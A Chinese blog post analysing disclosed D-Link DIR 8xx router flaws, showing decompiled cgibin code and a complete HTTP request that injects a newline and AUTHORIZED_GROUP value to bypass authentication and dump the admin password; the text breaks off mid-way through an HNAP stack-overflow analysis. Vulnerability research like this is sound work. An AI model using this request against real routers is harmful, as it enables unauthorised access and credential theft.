<!DOCTYPE html>
<html lang="zh-cn">
    <head>
        <meta charset="utf-8" />
        <meta name="robots" content="index,follow" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="author" content="Chu" />
        <meta name="description" content="Chu 的博客" />
        <meta name="keywords" content="Chu,网络安全,编程开发" />

        <title>D-Link DIR 8xx 漏洞分析 - Chu&#39;s BLoG</title>

        
		
		
        <link rel="stylesheet" href="/css/main.845fd2edca74b6bfad6e64d66336d257e9c6335ceaa98b7fd6b6e53343bd2220.css" integrity="sha256-hF/S7cp0tr&#43;tbmTWYzbSV&#43;nGM1zqqYt/1rblM0O9IiA=" />
        <link rel="alternate" href="/index.xml" type="application/atom+xml" title="RSS" />
    </head>

    <body>
        <header></header>
        <main>
<article>
    <header>
        <h1>D-Link DIR 8xx 漏洞分析</h1>
        <div>
            <time datetime="2017-09-22 15:54:46 +0800 CST">发布时间: 2017-09-22 15:54</time>
            <time datetime="2017-09-22 15:54:46 +0800 CST">更新时间: 2017-09-22 15:54</time>
        </div>
    </header>

    <section>
    <p>老外披露了几个 D-Link DIR 8xx 系列的漏洞，作为练手，对其分析、学习了下～</p>
<h2 id="参数注入导致认证绕过">参数注入导致认证绕过</h2>
<p>/usr/sbin/phpcgi 负责响应对于 .php、.txt、.asp 的请求，其实质为 /htdocs/cgibin 的链接文件：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>➜  dlink-dir8xx ls -l _DIR890LA1_FW108b03.bin.extracted/squashfs-root/usr/sbin/phpcgi
</span></span><span style="display:flex;"><span>lrwxr-xr-x  <span style="color:#ae81ff">1</span> chu  staff    14B  <span style="color:#ae81ff">9</span> <span style="color:#ae81ff">18</span> 14:58 _DIR890LA1_FW108b03.bin.extracted/squashfs-root/usr/sbin/phpcgi -&gt; /htdocs/cgibin
</span></span></code></pre></div><p>进而去逆向 /htdocs/cgibin：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  [...]
</span></span><span style="display:flex;"><span>  ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  ptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">strrchr</span>(<span style="color:#f92672">*</span>argv, <span style="color:#e6db74">&#39;/&#39;</span>);  <span style="color:#66d9ef">if</span> ( ptr )
</span></span><span style="display:flex;"><span>    filename <span style="color:#f92672">=</span> ptr <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    filename <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>argv;  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(filename, <span style="color:#e6db74">&#34;scandir.sgi&#34;</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_1D214</span>(argc, argv);
</span></span><span style="display:flex;"><span>  }  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(filename, <span style="color:#e6db74">&#34;phpcgi&#34;</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">handlePhpCgi</span>(argc, argv, envp);
</span></span><span style="display:flex;"><span>  }  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(filename, <span style="color:#e6db74">&#34;dlapn.cgi&#34;</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_F9E8</span>(argc, argv, envp);
</span></span><span style="display:flex;"><span>  [...]
</span></span></code></pre></div><p>程序通过判断文件名来对请求进行不同的处理。跟进 <code>handlePhpCgi</code> 后可以看到对请求参数、请求头进行解析后将执行权交给 php，解析过程如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">handlePhpCgi</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  [...]
</span></span><span style="display:flex;"><span>  ret <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;  <span style="color:#66d9ef">if</span> ( argc <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">Malloc0x18</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( buf )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">AddStr</span>(buf, argv[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">AddChar</span>(buf, <span style="color:#e6db74">&#39;\n&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">AddEnvp</span>(buf, envp);
</span></span><span style="display:flex;"><span>      method <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( method )                             <span style="color:#75715e">// 解析参数
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcasecmp</span>(method, <span style="color:#e6db74">&#34;HEAD&#34;</span>) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">ProcessHTTPRequest</span>(GetKeyValue, buf, <span style="color:#ae81ff">0x80000u</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcasecmp</span>(method, <span style="color:#e6db74">&#34;GET&#34;</span>) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">ProcessHTTPRequest</span>(GetKeyValue, buf, <span style="color:#ae81ff">0x80000u</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strcasecmp</span>(method, <span style="color:#e6db74">&#34;POST&#34;</span>) )
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">goto</span> LABEL_16;
</span></span><span style="display:flex;"><span>          ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">ProcessHTTPRequest</span>(PostKeyValue, buf, <span style="color:#ae81ff">0x80000u</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>  [...]
</span></span></code></pre></div><p>对参数进行解析后，将其储存以键值对的形式（_TYPE_KEY=VALUE，TYPE 为 GET、POST、SERVER），并以 <code>\n</code> 分隔储存到一字符串中，调试如下：</p>
<p><img src="1.webp" alt=""></p>
<p>然后进行认证检查，将检查的结果赋值给 <code>AUTHORIZED_GROUP</code> 并保存到字符串中作为全局变量传递给 php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>[...]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( ret <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    authFlag <span style="color:#f92672">=</span> <span style="color:#a6e22e">CheckAuth</span>();               <span style="color:#75715e">// 是否认证通过
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">sprintf</span>(<span style="color:#f92672">&amp;</span>s, <span style="color:#e6db74">&#34;AUTHORIZED_GROUP=%d&#34;</span>, authFlag);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">AddStr</span>(buf, <span style="color:#f92672">&amp;</span>s);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">AddChar</span>(buf, <span style="color:#e6db74">&#39;\n&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">AddStr</span>(buf, <span style="color:#e6db74">&#34;SESSION_UID=&#34;</span>);          <span style="color:#75715e">// 设置 Cookie
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">AddCookie</span>(buf);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">AddChar</span>(buf, <span style="color:#e6db74">&#39;\n&#39;</span>);
</span></span><span style="display:flex;"><span>    msg <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetMsgPtr</span>(buf);
</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">executePhpScript</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, msg, stdout);<span style="color:#75715e">// 执行 PHP 脚本}
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>[...]
</span></span></code></pre></div><p>在整个解析流程中并没有对参数中的 <code>\n</code> 进行过滤，所以如果通过注入 <code>\n</code> 进而注入 <code>AUTHORIZED_GROUP</code> 就可以绕过认证检查，未经授权执行 php 脚本。</p>
<p>分析 /htdocs/web/getcfg.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">text</span><span style="color:#f92672">/</span><span style="color:#a6e22e">xml</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;?&#34;</span>;<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;&lt;?echo &#34;?&gt;&#34;;?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;postxml&gt;&lt;? include &#34;/htdocs/phplib/trace.php&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">if ($_POST[&#34;CACHE&#34;] == &#34;true&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    echo dump(1, &#34;/runtime/session/&#34;.$SESSION_UID.&#34;/postxml&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">else
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if($AUTHORIZED_GROUP &lt; 0)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">         /* not a power user, return error message */
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">         echo &#34;\t&lt;result&gt;FAILED&lt;/result&gt;\n&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">         echo &#34;\t&lt;message&gt;Not authorized&lt;/message&gt;\n&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    else
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    { // 认证通过
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        /* cut_count() will return 0 when no or only one token. */
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $SERVICE_COUNT = cut_count($_POST[&#34;SERVICES&#34;], &#34;,&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        TRACE_debug(&#34;GETCFG: got &#34;.$SERVICE_COUNT.&#34; service(s): &#34;.$_POST[&#34;SERVICES&#34;]);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $SERVICE_INDEX = 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        while ($SERVICE_INDEX &lt; $SERVICE_COUNT)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $GETCFG_SVC = cut($_POST[&#34;SERVICES&#34;], $SERVICE_INDEX, &#34;,&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            TRACE_debug(&#34;GETCFG: serivce[&#34;.$SERVICE_INDEX.&#34;] = &#34;.$GETCFG_SVC);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if ($GETCFG_SVC!=&#34;&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $file = &#34;/htdocs/webinc/getcfg/&#34;.$GETCFG_SVC.&#34;.xml.php&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                /* GETCFG_SVC will be passed to the child process. */
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                // 执行 SERVICES 参数中的脚本
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if (isfile($file)==&#34;1&#34;) dophp(&#34;load&#34;, $file);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $SERVICE_INDEX++;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}?&gt;&lt;/postxml&gt;
</span></span></span></code></pre></div><p>在认证通过后程序获取 <code>$_POST[&quot;SERVICES&quot;]</code> 参数，将其拼接到字符串中进行包含。/htdocs/webinc/getcfg/ 目录（也可以通过 <code>../</code> 跳转目录）下为路由的配置文件，比如 <code>DEVICE.ACCOUNT.xml.php</code> 中保存着路由的管理密码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>[<span style="color:#f92672">...</span>]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span>(<span style="color:#e6db74">&#34;/device/account/entry&#34;</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($InDeX <span style="color:#f92672">&gt;</span> $cnt) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t\t</span><span style="color:#e6db74">&lt;entry&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t\t\t</span><span style="color:#e6db74">&lt;uid&gt;&#34;</span><span style="color:#f92672">.</span>       <span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;x&#34;</span>,<span style="color:#e6db74">&#34;uid&#34;</span>)<span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/uid&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t\t\t</span><span style="color:#e6db74">&lt;name&gt;&#34;</span><span style="color:#f92672">.</span>      <span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;x&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>)<span style="color:#f92672">.</span>    <span style="color:#e6db74">&#34;&lt;/name&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t\t\t</span><span style="color:#e6db74">&lt;usrid&gt;&#34;</span><span style="color:#f92672">.</span>     <span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;x&#34;</span>,<span style="color:#e6db74">&#34;usrid&#34;</span>)<span style="color:#f92672">.</span>   <span style="color:#e6db74">&#34;&lt;/usrid&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t\t\t</span><span style="color:#e6db74">&lt;password&gt;&#34;</span><span style="color:#f92672">.</span>  <span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;x&#34;</span>,<span style="color:#e6db74">&#34;password&#34;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/password&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t\t\t</span><span style="color:#e6db74">&lt;group&gt;&#34;</span><span style="color:#f92672">.</span>     <span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;x&#34;</span>, <span style="color:#e6db74">&#34;group&#34;</span>)<span style="color:#f92672">.</span>  <span style="color:#e6db74">&#34;&lt;/group&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t\t\t</span><span style="color:#e6db74">&lt;description&gt;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;x&#34;</span>,<span style="color:#e6db74">&#34;description&#34;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/description&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t\t</span><span style="color:#e6db74">&lt;/entry&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">...</span>]
</span></span></code></pre></div><p>完整利用请求如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /getcfg.php?a=b%0aAUTHORIZED_GROUP%3d0 <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span>
</span></span><span style="display:flex;"><span>Pragma<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-cache</span>
</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-cache</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,ko;q=0.2</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">23</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SERVICES=DEVICE.ACCOUNT
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HTTP/1.1 200 OK
</span></span><span style="display:flex;"><span>Server: WebServer
</span></span><span style="display:flex;"><span>Date: Tue, 19 Sep 2017 05:21:34 GMT
</span></span><span style="display:flex;"><span>Content-Type: text/xml
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
</span></span><span style="display:flex;"><span>[...]
</span></span><span style="display:flex;"><span>                &lt;uid&gt;&lt;/uid&gt;
</span></span><span style="display:flex;"><span>                &lt;name&gt;Admin&lt;/name&gt;
</span></span><span style="display:flex;"><span>                &lt;usrid&gt;&lt;/usrid&gt;
</span></span><span style="display:flex;"><span>                &lt;password&gt;1qaz2wsx3edc&lt;/password&gt;
</span></span><span style="display:flex;"><span>                &lt;group&gt;0&lt;/group&gt;
</span></span><span style="display:flex;"><span>[...]
</span></span></code></pre></div><p>获取到管理密码后可以通过上传固件等方式达到代码执行的效果。</p>
<h2 id="hnap-栈溢出">HNAP 栈溢出</h2>
<p>漏洞存在于针对 HNAP 请求的响应中，同样位于 /htdocs/cgibin 中：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    [...]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(filename, <span style="color:#e6db74">&#34;hnap&#34;</span>) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">handleHNAP</span>(argc, argv, envp);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    [...]
</span></span></code></pre></div><p>跟进 <code>handleHNAP</code>，其逻辑如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">handleHNAP</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  [...]
</span></span><span style="display:flex;"><span>  ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100u</span>);
</span></span><span style="display:flex;"><span>  authorization <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;HTTP_AUTHORIZATION&#34;</span>);
</span></span><span style="display:flex;"><span>  soapaction <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;HTTP_SOAPACTION&#34;</span>);
</span></span><span style="display:flex;"><span>  method <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span>);
</span></span><span style="display:flex;"><span>  a1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  hnapAuth <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;HTTP_HNAP_AUTH&#34;</span>);
</span></span><span style="display:flex;"><span>  cookie <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;HTTP_COOKIE&#34;</span>);
</span></span><span style="display:flex;"><span>  referer <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;HTTP_REFERER&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>name, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( soapaction )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strcmp</span>(soapaction, <span style="color:#e6db74">&#34;http://purenetworks.com/HNAP1/GetDeviceSettings&#34;</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strcmp</span>(soapaction, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">http://purenetworks.com/HNAP1/GetDeviceSettings</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strstr</span>(soapaction, <span style="color:#e6db74">&#34;http://purenetworks.com/HNAP1/GetCAPTCHAsetting&#34;</span>) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          soapaction <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://purenetworks.com/HNAP1/GetCAPTCHAsetting&#34;</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcasecmp</span>(method, <span style="color:#e6db74">&#34;POST&#34;</span>) )
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ProcessHTTPRequest</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>          ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_19C48</span>(cookie);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">goto</span> LABEL_46;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strstr</span>(soapaction, <span style="color:#e6db74">&#34;http://purenetworks.com/HNAP1/Login&#34;</span>) )
</span></span><span style="display:flex;"><span>        {
